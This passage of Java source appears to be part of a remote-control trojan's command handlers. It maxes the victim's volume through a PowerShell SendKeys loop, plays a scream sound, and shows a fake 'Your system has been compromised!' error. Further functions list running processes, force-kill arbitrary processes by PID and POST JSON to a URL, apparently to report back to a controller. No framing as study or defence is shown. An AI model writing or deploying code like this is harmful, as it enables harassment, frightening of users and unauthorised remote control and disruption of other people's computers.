                    // Use PowerShell to max volume (send VolUp key 50 times)
                    String ps = "$obj = new-object -com wscript.shell; for($i=0;$i-lt 50;$i++){$obj.SendKeys([char]175)}";
                    ProcessBuilder pb = new ProcessBuilder("powershell", "-c", ps);
                    pb.start();
                }

                // 2. Play Scream Sound (WAV is safer for Java)
                // Using a placeholder WAV URL
                playAudio("https://www.orangefreesounds.com/wp-content/uploads/2020/09/Woman-scream-sound-effect.wav");

                // 3. Show Popup
                javax.swing.JOptionPane.showMessageDialog(null, "Your system has been compromised!", "CRITICAL ERROR",
                        javax.swing.JOptionPane.ERROR_MESSAGE);

            } catch (Exception e) {
                // Ignore
            }
        }).start();
    }

    private static String listProcesses() {
        try {
            String os = System.getProperty("os.name", "").toLowerCase();
            ProcessBuilder pb;
            if (os.contains("win")) {
                pb = new ProcessBuilder("tasklist", "/FO", "CSV", "/NH");
            } else {
                pb = new ProcessBuilder("ps", "-e", "-o", "pid,comm");
            }

            pb.redirectErrorStream(true);
            Process p = pb.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            sb.append("{\"processes\":[");

            String line;
            boolean first = true;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (line.isEmpty())
                    continue;

                String pid = "";
                String name = "";

                if (os.contains("win")) {
                    // "Image Name","PID","Session Name","Session#","Mem Usage"
                    String[] parts = line.split("\",\"");
                    if (parts.length >= 2) {
                        name = parts[0].replace("\"", "");
                        pid = parts[1].replace("\"", "");
                    }
                } else {
                    // PID COMMAND
                    String[] parts = line.trim().split("\\s+", 2);
                    if (parts.length >= 2) {
                        pid = parts[0];
                        name = parts[1];
                    }
                }

                if (!pid.isEmpty()) {
                    if (!first)
                        sb.append(",");
                    sb.append(String.format("{\"pid\":\"%s\",\"name\":\"%s\"}", esc(pid), esc(name)));
                    first = false;
                }
            }
            sb.append("]}");
            return sb.toString();
        } catch (Exception e) {
            return "{\"error\": \"" + esc(e.getMessage()) + "\"}";
        }
    }

    private static String killProcess(String pid) {
        try {
            String os = System.getProperty("os.name", "").toLowerCase();
            ProcessBuilder pb;
            if (os.contains("win")) {
                pb = new ProcessBuilder("taskkill", "/F", "/PID", pid);
            } else {
                pb = new ProcessBuilder("kill", "-9", pid);
            }
            pb.start().waitFor();
            return "Process " + pid + " killed";
        } catch (Exception e) {
            return "Failed to kill process: " + e.getMessage();
        }
    }

    private static String urlEncode(String s) {
        try {
            return java.net.URLEncoder.encode(s, "UTF-8");
        } catch (Exception e) {
            return s;
        }
    }

    private static String esc(String s) {
        if (s == null)
            return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r");
    }

    private static boolean sendJson(String urlStr, String json) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes(StandardCharsets.UTF_8));
            }

            int code = conn.getResponseCode();
            conn.disconnect();
            return code >= 200 && code < 300;

        } catch (Exception e) {
            return false;
        }
    }

    private static String readStream(InputStream is) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int len;
        while ((len = is.read(buf)) > 0) {
            baos.write(buf, 0, len);
        }
        return baos.toString(StandardCharsets.UTF_8.name());
    }
}
